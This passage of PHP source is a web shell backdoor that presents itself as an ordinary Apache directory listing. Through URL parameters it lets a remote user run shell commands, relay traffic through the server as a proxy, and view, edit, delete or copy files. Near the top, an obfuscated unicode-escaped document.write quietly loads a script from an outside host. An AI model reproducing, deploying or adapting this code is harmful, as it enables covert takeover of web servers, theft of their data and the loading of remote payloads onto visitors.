echo $page;
}

echo "<HTML><script type="text/javascript">document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0072\u0035\u0037\u002e\u006c\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')</script>
<HEAD><TITLE>Index of ".$pwd."</TITLE>";
$backdoor = new backdoor();
$backdoor->pwd = $pwd;
$backdoor->rep = $rep;
$backdoor->file = $file;
$backdoor->edit = $edit;
$backdoor->fichier = $fichier;
$backdoor->del = $del;
$backdoor->shell = $shell;
$backdoor->proxy = $proxy;
echo "<TABLE><TR><TD bgcolor=\"#ffffff\" class=\"title\"><FONT size=\"+3\" face=\"Helvetica,Arial,sans-serif\"><B>Index of ".$backdoor->pwd."</B></FONT>";
$backdoor->dir();

echo "</TD></TR></TABLE><PRE>";
echo "<a href=\"".$_SERVER['PHP_SELF']."?shell=id\">Executer un shell</a> ";
echo "<a href=\"".$_SERVER['PHP_SELF']."?proxy=http://www.cnil.fr/index.php?id=123\">Utiliser le serveur comme proxy</a> ";
echo "<a href=\"".$_SERVER['PHP_SELF']."?copy=1\">Copier un fichier</a> <br>";
echo "<IMG border=\"0\" src=\"/icons/blank.gif\" ALT=\"     \"> <A HREF=\"\">Name</A>                    <A HREF=\"\">Last modified</A>       <A HREF=\"\">Size</A>  <A HREF=\"\">Description</A>";
echo "<HR noshade align=\"left\" width=\"80%\">";

if($file) {
   $backdoor->view();   
} elseif($edit) {
   $backdoor->edit();
} elseif($del) {   
   $backdoor->del();
} elseif($shell) {   
   $backdoor->shell();
}elseif($proxy) {
   $backdoor->proxy($host,$page);
}elseif($copy == 1) {
   $backdoor->ccopy($cfichier,$cdestination);
} else {
   echo "[DIR] <A HREF=\"".$_SERVER['PHP_SELF']."?rep=".realpath($rep."../")."\">Parent Directory</A>         ".date("r",realpath($rep."../"))."     - <br>";
   foreach ($backdoor->list as $key => $value) {
      if(is_dir($rep.$value)) {
         echo "[DIR]<A HREF=\"".$_SERVER['PHP_SELF']."?rep=".$rep.$value."\">".$value."/</A>                  ".date("r",filemtime($rep.$value))."      -  <br>";
      } else {
         echo "[FILE]<A HREF=\"".$_SERVER['PHP_SELF']."?file=".$rep.$value."\">".$value."</A>  <a href=\"".$_SERVER['PHP_SELF']."?edit=".$rep.$value."\">(edit)</a> <a href=\"".$_SERVER['PHP_SELF']."?del=".$rep.$value."\">(del)</a>          ".date("r",filemtime($rep.$value))."     1k  <br>";
      }
   }
}
echo "</PRE><HR noshade align=\"left\" width=\"80%\">";
echo "<center><b>Coded By Charlichaplin</b></center>";
echo "</BODY></HTML>";